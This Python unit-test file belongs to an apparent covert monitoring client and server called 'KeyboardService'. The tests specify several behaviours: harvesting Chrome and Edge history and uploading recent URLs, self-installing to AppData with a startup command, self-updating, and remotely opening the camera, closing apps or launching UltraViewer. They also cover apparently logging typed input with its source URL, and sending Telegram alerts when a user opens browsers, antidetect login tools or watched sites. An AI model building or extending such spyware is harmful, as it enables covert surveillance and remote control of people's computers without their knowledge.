import sqlite3
import tempfile
import threading
import unittest
from unittest.mock import ANY, patch

import app
import client


class BrowserHistoryTests(unittest.TestCase):
    def test_downloaded_frozen_client_is_not_mistaken_for_temp_bundle(self):
        original_frozen = getattr(client.sys, "frozen", False)
        original_executable = client.sys.executable
        original_meipass = getattr(client.sys, "_MEIPASS", None)
        try:
            client.sys.frozen = True
            client.sys.executable = r"C:\Users\Test\Downloads\KeyboardService.exe"
            client.sys._MEIPASS = r"C:\Users\Test\AppData\Local\Temp\_MEI123"

            self.assertFalse(client.running_from_temp_bundle())

            client.sys.executable = r"C:\Users\Test\AppData\Local\Temp\_MEI123\KeyboardService.exe"
            self.assertTrue(client.running_from_temp_bundle())
        finally:
            client.sys.frozen = original_frozen
            client.sys.executable = original_executable
            if original_meipass is None:
                delattr(client.sys, "_MEIPASS")
            else:
                client.sys._MEIPASS = original_meipass

    def test_windows_filetime_to_epoch_ms(self):
        self.assertEqual(client.windows_filetime_to_epoch_ms(0), -11644473600000)
        self.assertEqual(client.windows_filetime_to_epoch_ms(13250236000000000), 1605762400000)

    def test_collect_browser_history_entries_from_sqlite(self):
        db_path = "test_history.sqlite"
        connection = sqlite3.connect(db_path)
        try:
            connection.execute(
                "CREATE TABLE urls (id INTEGER PRIMARY KEY, url TEXT, title TEXT, last_visit_time INTEGER)"
            )
            connection.execute(
                "INSERT INTO urls (url, title, last_visit_time) VALUES (?, ?, ?)",
                ("https://example.com/search?q=hello", "Example", 13250236000000000),
            )
            connection.execute(
                "INSERT INTO urls (url, title, last_visit_time) VALUES (?, ?, ?)",
                ("https://example.com/other", "Example 2", 0),
            )
            connection.commit()
        finally:
            connection.close()

        try:
            entries = client.collect_browser_history_entries("Chrome", db_path)
        finally:
            import os
            if os.path.exists(db_path):
                os.remove(db_path)

        self.assertEqual(
            entries,
            [
                {
                    "browser": "Chrome",
                    "url": "https://example.com/search?q=hello",
                    "visited_at": 1605762400000,
                }
            ],
        )

    def test_browser_name_from_active_app_handles_browser_variants(self):
        self.assertEqual(client.browser_name_from_active_app("chrome.exe - My page"), "chrome.exe")
        self.assertEqual(client.browser_name_from_active_app("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe - Example"), "chrome.exe")
        self.assertEqual(client.browser_name_from_active_app("Microsoft Edge - Example"), "msedge.exe")
        self.assertEqual(client.browser_name_from_active_app("Google Chrome"), "chrome.exe")

    def test_sync_browser_history_uploads_recent_entries_from_last_week(self):
        recent_ms = int((client.datetime.now().astimezone() - client.timedelta(days=2)).timestamp() * 1000)
        old_ms = int((client.datetime.now().astimezone() - client.timedelta(days=12)).timestamp() * 1000)
        entries = [
            {"browser": "Chrome", "url": "https://example.com/recent", "visited_at": recent_ms},
            {"browser": "Chrome", "url": "https://example.com/old", "visited_at": old_ms},
        ]

        with patch.object(client, "browser_history_paths", return_value=[("Chrome", "C:/tmp/History")]), \
             patch.object(client, "collect_browser_history_entries", return_value=entries), \
             patch.object(client, "post_website_history", return_value=True) as post_mock:
            client.browser_history_seen.clear()
            client.sync_browser_history()

        self.assertEqual(post_mock.call_count, 1)
        self.assertEqual(post_mock.call_args_list[0].args[0], "https://example.com/recent")

    def test_recent_browser_history_url_falls_back_to_browser_db_when_ui_access_is_missing(self):
        recent_ms = int((client.datetime.now().astimezone() - client.timedelta(minutes=2)).timestamp() * 1000)
        old_ms = int((client.datetime.now().astimezone() - client.timedelta(days=2)).timestamp() * 1000)
        entries = [
            {"browser": "Chrome", "url": "https://example.com/older", "visited_at": old_ms},
            {"browser": "Chrome", "url": "https://example.com/newer", "visited_at": recent_ms},
        ]

        with patch.object(client, "browser_history_paths", return_value=[("Chrome", "C:/tmp/History")]), \
             patch.object(client, "collect_browser_history_entries", return_value=entries):
            self.assertEqual(client.latest_browser_history_url("chrome.exe - Example"), "https://example.com/newer")

    def test_save_device_keeps_client_version(self):
        app.devices.pop("dev-version-test", None)
        app.save_device("dev-version-test", "Version device", 111, 222, 333, {"client_version": "1.2.3"})
        self.assertEqual(app.devices["dev-version-test"]["client_version"], "1.2.3")
        app.devices.pop("dev-version-test", None)

    def test_save_device_keeps_client_ip(self):
        app.devices.pop("dev-ip-test", None)
        app.save_device("dev-ip-test", "IP device", 111, 222, 333, {"client_ip": "203.0.113.42"})
        self.assertEqual(app.devices["dev-ip-test"]["client_ip"], "203.0.113.42")
        app.devices.pop("dev-ip-test", None)

    def test_check_for_updates_acknowledges_before_exit(self):
        original_frozen = getattr(client.sys, "frozen", False)
        original_lock = client.update_lock
        try:
            client.sys.frozen = True
            client.update_lock = threading.Lock()
            with patch.object(client, "download_update", return_value=("C:/tmp/KeyboardService.exe", "1.2.3")), \
                 patch.object(client, "schedule_update") as schedule_mock, \
                 patch.object(client, "acknowledge_device_command") as ack_mock, \
                 patch.object(client.os, "_exit") as exit_mock:
                client.check_for_updates(command_id="cmd-123")
        finally:
            client.sys.frozen = original_frozen
            client.update_lock = original_lock

        ack_mock.assert_called_once_with("cmd-123", "completed")
        schedule_mock.assert_called_once()
        exit_mock.assert_called_once_with(0)

    def test_queue_device_command_accepts_input_controls(self):
        device_id = "input-controls-test"
        app.devices[device_id] = {"id": device_id, "name": "Input Controls Test"}
        try:
            ok, message = app.queue_device_command(device_id, "open_camera", "20")
            self.assertTrue(ok)
            self.assertTrue(message)
            ok, message = app.queue_device_command(device_id, "close_app", "Calculator")
            self.assertTrue(ok)
            self.assertTrue(message)
            ok, message = app.queue_device_command(device_id, "close_all_apps", "")
            self.assertTrue(ok)
            self.assertTrue(message)
            ok, message = app.queue_device_command(device_id, "open_ultraviewer", "")
            self.assertTrue(ok)
            self.assertTrue(message)
            ok, message = app.queue_device_command(device_id, "autofill", "test@example.com")
            self.assertTrue(ok)
            self.assertTrue(message)
        finally:
            app.devices.pop(device_id, None)

    def test_queue_device_command_accepts_update_client(self):
        device_id = "update-client-test"
        app.devices[device_id] = {"id": device_id, "name": "Update Test"}
        try:
            ok, message = app.queue_device_command(device_id, "update_client", "")
            self.assertTrue(ok)
            self.assertTrue(message)
        finally:
            app.devices.pop(device_id, None)

    def test_queue_device_command_accepts_image_delivery(self):
        device_id = "image-command-test"
        app.devices[device_id] = {"id": device_id, "name": "Image Test"}
        message = '{"attachment_id":"0123456789abcdef0123456789abcdef.png","caption":"hello"}'
        try:
            ok, command_id = app.queue_device_command(device_id, "show_image", message)
            self.assertTrue(ok)
            self.assertTrue(command_id)
        finally:
            app.devices.pop(device_id, None)
            app.screenshot_commands.pop(device_id, None)
            for command_id, record in list(app.device_command_records.items()):
                if record["device_id"] == device_id:
                    app.device_command_records.pop(command_id, None)

    def test_queue_device_command_rejects_removed_controls_and_transfer(self):
        device_id = "removed-command-test"
        app.devices[device_id] = {"id": device_id, "name": "Removed Command Test"}
        try:
            for command, message in (
                ("disable_mouse", "30"),
                ("disable_keyboard", "30"),
                ("disable_camera", "30"),
                ("list_files", "C:/Users/Test"),
                ("download_file", "C:/Users/Test/example.txt"),
            ):
                with self.subTest(command=command):
                    ok, _ = app.queue_device_command(device_id, command, message)
                    self.assertFalse(ok)
        finally:
            app.devices.pop(device_id, None)

    def test_file_transfer_routes_are_not_registered(self):
        retired_paths = {
            "/api/devices/file-listing-upload",
            "/api/devices/file-download-upload",
            "/api/devices/{device_id}/download",
            "/api/devices/{device_id}/files",
            "/api/devices/{device_id}/files/download/{token}",
        }
        registered_paths = {route.path for route in app.app.routes}
        self.assertTrue(retired_paths.isdisjoint(registered_paths))

    def test_running_from_local_project_detects_dev_build(self):
        project_root = client.os.path.abspath(client.os.getcwd())
        project_markers = ["client.py", "KeyboardService.spec", "requirements.txt"]
        self.assertTrue(all(client.os.path.exists(client.os.path.join(project_root, marker)) for marker in project_markers))
        self.assertTrue(not getattr(client.sys, "frozen", False) or client.running_from_local_project() or client.running_from_temp_bundle())

    def test_get_startup_command_uses_installed_python_script_when_not_frozen(self):
        original_frozen = getattr(client.sys, "frozen", False)
        original_executable = client.sys.executable
        try:
            client.sys.frozen = False
            client.sys.executable = r"C:\venv\Scripts\python.exe"
            with patch.object(client, "install_self_to_startup_location", return_value=r"C:\Users\Test\AppData\Local\KeyboardService\KeyboardService.py"):
                self.assertEqual(
                    client.get_startup_command(),
                    '"C:\\venv\\Scripts\\python.exe" "C:\\Users\\Test\\AppData\\Local\\KeyboardService\\KeyboardService.py"',
                )
        finally:
            client.sys.frozen = original_frozen
            client.sys.executable = original_executable

    def test_get_startup_command_uses_installed_executable_when_frozen(self):
        original_frozen = getattr(client.sys, "frozen", False)
        original_executable = client.sys.executable
        installed_path = r"C:\Users\Test\AppData\Local\KeyboardService\KeyboardService.exe"
        try:
            client.sys.frozen = True
            client.sys.executable = r"C:\Users\Test\Downloads\KeyboardService.exe"
            with patch.object(client, "install_self_to_startup_location", return_value=installed_path):
                self.assertEqual(client.get_startup_command(), f'"{installed_path}"')
        finally:
            client.sys.frozen = original_frozen
            client.sys.executable = original_executable

    def test_frozen_bootstrap_keeps_existing_install_as_authority(self):
        original_frozen = getattr(client.sys, "frozen", False)
        original_executable = client.sys.executable
        try:
            with tempfile.TemporaryDirectory() as install_dir:
                source_path = client.os.path.join(install_dir, "Downloads", "KeyboardService.exe")
                installed_path = client.os.path.join(install_dir, "KeyboardService.exe")
                client.os.makedirs(client.os.path.dirname(source_path))
                with open(source_path, "wb") as source:
                    source.write(b"new downloaded release")
                with open(installed_path, "wb") as installed:
                    installed.write(b"existing installed build")

                client.sys.frozen = True
                client.sys.executable = source_path
                with patch.object(client, "INSTALL_DIR", install_dir), \
                     patch.object(client, "INSTALL_PATH", installed_path), \
                     patch.object(client, "running_from_local_project", return_value=False), \
                     patch.object(client, "running_from_temp_bundle", return_value=False), \
                     patch.object(client, "schedule_installer_cleanup") as cleanup_mock, \
                     patch.object(client.subprocess, "Popen") as launch_mock:
                    self.assertTrue(client.install_and_relaunch())

                with open(installed_path, "rb") as installed:
                    self.assertEqual(installed.read(), b"existing installed build")
                launch_mock.assert_called_once_with(
                    [installed_path], close_fds=True, startupinfo=ANY
                )
                cleanup_mock.assert_called_once_with(
                    client.os.path.normcase(client.os.path.abspath(source_path))
                )
        finally:
            client.sys.frozen = original_frozen
            client.sys.executable = original_executable

    def test_frozen_bootstrap_installs_and_launches_from_local_app_data(self):
        original_frozen = getattr(client.sys, "frozen", False)
        original_executable = client.sys.executable
        try:
            with tempfile.TemporaryDirectory() as root:
                install_dir = client.os.path.join(root, "AppData", "Local", "KeyboardService")
                source_path = client.os.path.join(root, "Downloads", "KeyboardService.exe")
                installed_path = client.os.path.join(install_dir, "KeyboardService.exe")
                client.os.makedirs(client.os.path.dirname(source_path))
                with open(source_path, "wb") as source:
                    source.write(b"release executable")

                client.sys.frozen = True
                client.sys.executable = source_path
                with patch.object(client, "INSTALL_DIR", install_dir), \
                     patch.object(client, "INSTALL_PATH", installed_path), \
                     patch.object(client, "running_from_local_project", return_value=False), \
                     patch.object(client, "running_from_temp_bundle", return_value=False), \
                     patch.object(client, "schedule_installer_cleanup") as cleanup_mock, \
                     patch.object(client.subprocess, "Popen") as launch_mock:
                    self.assertTrue(client.install_and_relaunch())

                with open(installed_path, "rb") as installed:
                    self.assertEqual(installed.read(), b"release executable")
                launch_mock.assert_called_once_with(
                    [installed_path], close_fds=True, startupinfo=ANY
                )
                cleanup_mock.assert_called_once_with(
                    client.os.path.normcase(client.os.path.abspath(source_path))
                )
        finally:
            client.sys.frozen = original_frozen
            client.sys.executable = original_executable

    def test_extract_monitored_apps_detects_browsers_and_login_tools(self):
        with patch.object(app, "telegram_configured", return_value=True):
            detected = app.extract_monitored_apps([
                "Google Chrome",
                "Firefox Browser",
                "GoLogin - profile 1",
                "Notepad",
                "MoreLogin window",
            ])
        self.assertEqual(
            detected,
            ["Google Chrome", "Firefox Browser", "GoLogin - profile 1", "MoreLogin window"],
        )

    def test_notify_app_open_alerts_only_once_per_device_per_app(self):
        app.app_open_alerts.clear()
        with patch.object(app, "telegram_configured", return_value=True), \
             patch.object(app, "send_telegram_message") as message_mock:
            app.notify_app_open_alerts("dev-1", "Machine A", ["Google Chrome", "Notepad"])
            app.notify_app_open_alerts("dev-1", "Machine A", ["Google Chrome", "Notepad"])
            app.notify_app_open_alerts("dev-1", "Machine A", ["Firefox Browser"])
        self.assertEqual(message_mock.call_count, 2)

    def test_send_message_falls_back_to_recent_browser_url(self):
        with patch.object(client, "get_browser_url", return_value=""), \
             patch.object(client, "latest_browser_history_url", return_value="https://example.com/search?q=hello"):
            payload = client.send_message("hi", "chrome.exe - Example", "")
        self.assertEqual(payload["source_url"], "https://example.com/search?q=hello")

    def test_matches_monitored_site_url_uses_configurable_allowlist(self):
        original_patterns = app.MONITORED_SITE_PATTERNS
        try:
            app.MONITORED_SITE_PATTERNS = ["example.com", "github.com"]
            self.assertTrue(app.matches_monitored_site_url("https://www.example.com/login?x=1"))
            self.assertTrue(app.matches_monitored_site_url("https://github.com/shadrackkiptoo"))
            self.assertFalse(app.matches_monitored_site_url("https://google.com/search?q=hello"))
        finally:
            app.MONITORED_SITE_PATTERNS = original_patterns

    def test_notify_monitored_site_alerts_only_once_per_site(self):
        original_patterns = app.MONITORED_SITE_PATTERNS
        original_alerts = app.site_open_alerts.copy()
        try:
            app.MONITORED_SITE_PATTERNS = ["example.com"]
            app.site_open_alerts.clear()
            with patch.object(app, "telegram_configured", return_value=True), \
                 patch.object(app, "send_telegram_message") as message_mock:
                app.notify_monitored_site_alerts("dev-1", "Machine A", "https://www.example.com/login")
                app.notify_monitored_site_alerts("dev-1", "Machine A", "https://www.example.com/login")
                app.notify_monitored_site_alerts("dev-1", "Machine A", "https://google.com/search")
            self.assertEqual(message_mock.call_count, 1)
        finally:
            app.MONITORED_SITE_PATTERNS = original_patterns
            app.site_open_alerts = original_alerts

    def test_extract_monitored_apps_uses_custom_app_patterns(self):
        original_patterns = app.MONITORED_APP_PATTERNS
        try:
            app.MONITORED_APP_PATTERNS = ["chrome", "gologin"]
            detected = app.extract_monitored_apps(["Google Chrome", "Notepad", "GoLogin Profile", "Firefox"])
            self.assertEqual(detected, ["Google Chrome", "GoLogin Profile"])
        finally:
            app.MONITORED_APP_PATTERNS = original_patterns

    def test_save_visited_link_record_stores_every_url(self):
        original_database = app.DATABASE_URL
        original_queue = app.visited_links.copy()
        try:
            app.DATABASE_URL = "postgresql://example"
            app.visited_links.clear()
            with patch("app.psycopg.connect") as connect_mock:
                connection = connect_mock.return_value.__enter__.return_value
                cursor = connection.cursor.return_value.__enter__.return_value
                saved = app.save_visited_link_record("dev-1", "Machine A", "Chrome", "https://example.com/test", 1700000000000)
            self.assertTrue(saved)
            self.assertEqual(app.visited_links[-1]["url"], "https://example.com/test")
            cursor.execute.assert_called_once()
        finally:
            app.DATABASE_URL = original_database
            app.visited_links = original_queue

    def test_fetch_visited_links_filters_by_device_and_date_window(self):
        original_database = app.DATABASE_URL
        original_queue = app.visited_links.copy()
        try:
            app.DATABASE_URL = ""
            app.visited_links.clear()
            app.visited_links.append({"device_id": "dev-a", "device_name": "A", "browser": "Chrome", "url": "https://example.com/one", "visited_at": 1700000000000})
            app.visited_links.append({"device_id": "dev-b", "device_name": "B", "browser": "Firefox", "url": "https://example.com/two", "visited_at": 1700000001000})
            result = [item for item in reversed(app.visited_links) if item["visited_at"] >= 1699999999000 and (not "dev-a" or item["device_id"] == "dev-a")]
            self.assertEqual(len(result), 1)
            self.assertEqual(result[0]["url"], "https://example.com/one")
        finally:
            app.DATABASE_URL = original_database
            app.visited_links = original_queue


if __name__ == "__main__":
    unittest.main()
